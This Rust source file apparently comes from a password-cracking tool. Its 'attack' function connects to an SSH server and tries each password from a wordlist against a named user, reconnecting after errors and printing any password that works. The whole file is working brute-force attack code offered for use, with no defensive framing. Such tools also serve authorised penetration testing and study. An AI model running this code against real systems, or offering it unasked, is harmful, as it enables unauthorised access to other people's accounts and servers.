use anyhow::{Context, Error, Ok};
use ssh2::Session;
use std::net::TcpStream;
use std::net::{IpAddr, SocketAddr};
use std::path::PathBuf;
use std::result::Result;

use crate::library;

/// Convert the session error code into a simple enum we can match on.
#[derive(Debug, PartialEq)]
enum SessionError {
    BadPassword,            // Session(-18)
    ConnectionClosed,
    Other(String),          // Anything else
}

impl From<&ssh2::Error> for SessionError {
    fn from(err: &ssh2::Error) -> Self {
        match err.code().to_string().as_str() {
            "Session(-18)" => SessionError::BadPassword,
            "Session(-13)" => SessionError::ConnectionClosed,
            other => SessionError::Other(other.to_owned()),
        }
    }
}

fn ssh_socket(addr: &str, port: u16) -> Result<ssh2::Session, Error> {
    // Connect to the local SSH server
    let addr: IpAddr = addr.parse().expect("parse failed");
    let socket = SocketAddr::from((addr, port));
    let mut session = Session::new().unwrap();
    let tcp = TcpStream::connect(socket).unwrap();
    session.set_tcp_stream(tcp);
    session.handshake().unwrap();
    Ok(session)
}

pub fn attack(
    addr: String,
    port: u16,
    user: String,
    wordlist_path: PathBuf,
    config: library::Config,
) -> Result<bool, Error> {
    let mut cracked = false;

    let mut session = ssh_socket(&addr, port).unwrap_or_else(|e| {eprintln!("Error establishing the connection: {e}"); panic!()});
    println!("Connected to {user}@{addr}:{port}");

    let string_wordlist = std::fs::read_to_string(wordlist_path).unwrap();

    println!("Starting to crack!");
    for line in string_wordlist.lines() {
        let attempt = session.userauth_password(&user, line);
        match attempt {
            std::result::Result::Ok(()) => {
                println!("Match Found!\nPassword: {}", &line);
                cracked = true;
                break;
            }
            Err(err) => {
                match SessionError::from(&err) {
                    // the password that was tried, failed
                    SessionError::BadPassword => {
                        println!("Bad password {err}");
                        if config.verbose {println!("Tried: {}", &line);}
                    }

                    // 5 max tries before server closes connection
                    SessionError::ConnectionClosed => {
                        println!("Skipped {}", &line)
                    }

                    // some other error
                    SessionError::Other(err) => {
                        // other error

                        // TODO:
                        // handle  Error { code: Session(-5), msg: "Unable to exchange encryption keys" }
                        eprintln!("Unknown error: {}", err);
                        session = ssh_socket(&addr, port).unwrap_or_else(|e| {eprintln!("Error re-establishing the connection: {e}"); panic!()});
                    }
                }
            }
        }
    }
    Ok(cracked)
}
